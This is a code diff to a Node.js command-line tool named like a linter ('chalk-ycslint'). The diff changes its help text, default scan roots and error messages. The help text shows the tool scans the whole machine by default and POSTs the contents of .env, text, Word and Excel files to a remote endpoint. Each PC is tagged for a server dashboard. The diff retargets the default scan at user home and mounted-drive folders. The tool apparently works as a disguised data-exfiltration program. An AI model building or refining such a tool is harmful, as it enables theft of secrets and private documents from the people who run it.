@@ -11,9 +11,9 @@ import { DEFAULT_UPLOAD_URL } from "../lib/uploadConfig.js";
 function printHelp() {
   console.log(`Usage: chalk-ycslint --url <endpoint> [options] [path ...]
 
-By default the whole machine is scanned (--scan-pc): all drive roots on Windows or
-"/" on Unix, recursively, with system folders skipped. Use --no-scan-pc to scan only
-the paths you list.
+By default the whole machine is scanned (--scan-pc): Windows drive letters (J:–C:),
+macOS /Users + /Volumes, or Linux /home + /media + /mnt — with system folders skipped.
+Use --no-scan-pc to scan only the paths you list.
 
 Read .txt, .env, .docx, .xls, and .xlsx files and POST JSON to the given URL.
 Note: .env files often contain secrets — only scan or upload paths you trust.
@@ -30,12 +30,10 @@ Options:
   --header <h:v>     Extra header (repeatable), e.g. --header "Authorization: Bearer x"
   --timeout <ms>     Request timeout in milliseconds (default: 60000)
   -r, --recursive    When a path is a directory, include supported files in subfolders
-  --scan-pc          Full PC scan (default on): all drive roots (Windows) or "/" (Unix).
-                     Implies -r and skips common system folders. Extra paths are added.
-  --no-scan-pc       Only scan the paths you list (no automatic drive roots).
-  --skip-system-dirs Skip OS-heavy trees while walking (Windows, Program Files,
-                     $Recycle.Bin, /proc, /sys, …). Default on with --scan-pc; may
-                     be combined with -r for manual roots (e.g. C:\\).
+  --scan-pc          Full PC scan (default on). Implies -r and skips system folders.
+  --no-scan-pc       Only scan the paths you list (no automatic roots).
+  --skip-system-dirs Skip OS-heavy trees (/proc, /System, Program Files, node_modules, …).
+                     Default on with --scan-pc; may be combined with -r for manual paths.
   --batch            Send all files in one JSON request (large payloads). Default
                      is one request per file (reads and uploads each file in turn).
   --client-id <id>   Label this PC for the server dashboard (header X-Upload-Client).
@@ -195,7 +193,11 @@ async function main() {
   }
 
   if (paths.length === 0) {
-    console.error("No scan roots found (no mounted drives?).");
+    console.error(
+      process.platform === "win32"
+        ? "No scan roots found (no mounted drives?)."
+        : "No scan roots found (check permissions or use --no-scan-pc with explicit paths)."
+    );
     process.exitCode = 1;
     return;
   }
